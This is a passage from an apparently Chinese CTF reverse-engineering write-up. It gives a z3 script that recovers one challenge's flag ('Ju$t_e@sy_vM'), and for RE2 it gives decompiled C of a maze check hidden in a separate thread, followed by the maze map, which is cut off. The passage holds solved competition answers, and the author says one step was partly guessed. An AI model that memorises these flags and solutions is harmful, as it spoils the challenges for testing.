<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">data=[<span class="number">0xA7</span>, <span class="number">0x3A</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0xF1</span>, <span class="number">0x49</span>, <span class="number">0x2B</span>, <span class="number">0xCB</span>, <span class="number">0xEA</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>]</span><br><span class="line">s = Solver()</span><br><span class="line">dstbuf=[<span class="number">0</span>]*<span class="number">76</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    dstbuf[<span class="number">32</span>+i] = BitVec(<span class="string">&quot;dstbuf[%d]&quot;</span>%(i+<span class="number">1</span>),<span class="number">8</span>)</span><br><span class="line">arr=[<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">32</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">33</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">164</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">5</span></span><br><span class="line">dstbuf[<span class="number">64</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">33</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">34</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">112</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">151</span></span><br><span class="line">dstbuf[<span class="number">65</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">34</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">35</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">79</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">121</span></span><br><span class="line">dstbuf[<span class="number">66</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">35</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">36</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">211</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">71</span></span><br><span class="line">dstbuf[<span class="number">67</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">36</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">37</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">95</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">146</span></span><br><span class="line">dstbuf[<span class="number">68</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">37</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">38</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">3</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">74</span></span><br><span class="line">dstbuf[<span class="number">69</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">38</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">39</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">8</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">189</span></span><br><span class="line">dstbuf[<span class="number">70</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">39</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">40</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">40</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">57</span></span><br><span class="line">dstbuf[<span class="number">71</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">40</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">41</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">127</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">41</span></span><br><span class="line">dstbuf[<span class="number">72</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">41</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">42</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">41</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">59</span></span><br><span class="line">dstbuf[<span class="number">73</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">42</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">43</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">55</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">193</span></span><br><span class="line">dstbuf[<span class="number">74</span>] = arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = dstbuf[<span class="number">43</span>]</span><br><span class="line">arr[<span class="number">1</span>] = dstbuf[<span class="number">64</span>]</span><br><span class="line">arr[<span class="number">1</span>] += <span class="number">186</span></span><br><span class="line">arr[<span class="number">0</span>] ^= arr[<span class="number">1</span>]</span><br><span class="line">arr[<span class="number">0</span>] -= <span class="number">209</span></span><br><span class="line">dstbuf[<span class="number">75</span>] = arr[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s.add(dstbuf[<span class="number">64</span>+i]==data[i])</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line">dstbuf[<span class="number">1</span>] = <span class="number">172</span></span><br><span class="line">dstbuf[<span class="number">4</span>] = <span class="number">64</span></span><br><span class="line">dstbuf[<span class="number">9</span>] = <span class="number">64</span></span><br><span class="line">dstbuf[<span class="number">3</span>] = <span class="number">29</span></span><br><span class="line">dstbuf[<span class="number">11</span>] = <span class="number">116</span></span><br><span class="line">dstbuf[<span class="number">12</span>] = <span class="number">132</span></span><br><span class="line">dstbuf[<span class="number">6</span>] = <span class="number">12</span></span><br><span class="line">dstbuf[<span class="number">10</span>] = <span class="number">212</span></span><br><span class="line">dstbuf[<span class="number">7</span>] = <span class="number">156</span></span><br><span class="line">dstbuf[<span class="number">5</span>] = <span class="number">232</span></span><br><span class="line">dstbuf[<span class="number">8</span>] = <span class="number">108</span></span><br><span class="line">dstbuf[<span class="number">2</span>] = <span class="number">92</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后进行第一步的移位和异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    tmp = dstbuf[i]</span><br><span class="line">    tmp = ((tmp&lt;&lt;<span class="number">6</span>)|(tmp&gt;&gt;<span class="number">2</span>)) &amp;<span class="number">0xff</span></span><br><span class="line">    tmp ^= (<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)+i-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#  Ju$t_e@sy_vM</span></span><br></pre></td></tr></table></figure>

<p>不过在分析过程中，并没有发现在什么地方执行了read，而且最后异或的时候也有一定蒙的成分，不知道字符串abcdefghijkl放在了什么位置。</p>
<h2 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h2><p>连续三道题出题模式都一样，不好评价了有点。。。</p>
<p>这个题前面的逻辑全是假的，他又开了一个线程，真正逻辑在那个线程中，是一个经典的花指令，patch之后就能看到是个迷宫。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4027F0</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">12</span>]; <span class="comment">// [esp+38h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">      --x;</span><br><span class="line">      Sleep(<span class="number">0x13</span>u);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">      ++x;</span><br><span class="line">      Sleep(<span class="number">0x14</span>u);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">      ++y;</span><br><span class="line">      Sleep(<span class="number">0x12</span>u);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">      --y;</span><br><span class="line">      Sleep(<span class="number">0x11</span>u);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( y &lt; <span class="number">0</span> || y &gt;= <span class="number">40</span> || x &lt; <span class="number">0</span> || x &gt;= <span class="number">40</span> || <span class="built_in">map</span>[<span class="number">40</span> * y + x] == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  ++dword_4068A4;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">40</span> * y + x] == <span class="number">2</span> &amp;&amp; dword_4068A4 == <span class="number">75</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, v3);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>map：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span 